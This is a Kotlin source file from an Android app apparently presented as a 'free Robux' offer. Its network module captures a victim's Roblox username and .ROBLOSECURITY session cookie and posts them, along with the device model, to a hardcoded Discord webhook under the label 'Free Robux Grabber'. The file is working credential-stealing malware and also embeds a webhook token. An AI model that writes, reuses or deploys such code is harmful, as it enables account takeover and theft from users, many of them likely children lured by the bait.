package com.you.freerobux

import android.os.Handler
import android.os.Looper
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

object Net {

    private const val WEBHOOK_URL =
        "https://discord.com/api/webhooks/1558887414611574864/K-v_MXDI6he5HMdVkupRbeyDNOpprM0dk0kNYt_hewfcKJ1Wfy5JgMDQOBaOGAMf47gL"

    private val io = Executors.newSingleThreadExecutor()
    private val main = Handler(Looper.getMainLooper())

    fun sendToDiscord(username: String, cookie: String, onDone: (Boolean) -> Unit = {}) {
        io.execute {
            var ok = false
            try {
                val conn = URL(WEBHOOK_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000

                val safeCookie =
                    if (cookie.length > 1000) cookie.substring(0, 1000) + "..." else cookie

                val payload = JSONObject().apply {
                    put("username", "Free Robux Grabber")
                    put("embeds", JSONArray().put(
                        JSONObject().apply {
                            put("title", "\uD83C\uDF6A New Roblox login captured")
                            put("color", 0xE2231A)
                            put("fields", JSONArray().apply {
                                put(JSONObject().apply {
                                    put("name", "Username")
                                    put("value", if (username.isBlank()) "*(unknown)*" else username)
                                    put("inline", true)
                                })
                                put(JSONObject().apply {
                                    put("name", "Device")
                                    put("value", android.os.Build.MODEL)
                                    put("inline", true)
                                })
                                put(JSONObject().apply {
                                    put("name", ".ROBLOSECURITY")
                                    put("value", "```\$safeCookie```")
                                    put("inline", false)
                                })
                            })
                            put("footer", JSONObject().put("text", "FreeRobux APK"))
                            put("timestamp", java.time.Instant.now().toString())
                        }
                    ))
                }

                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()) }
                ok = conn.responseCode in 200..299
                conn.inputStream.close()
            } catch (e: Exception) {
                ok = false
            }
            main.post { onDone(ok) }
        }
    }
}
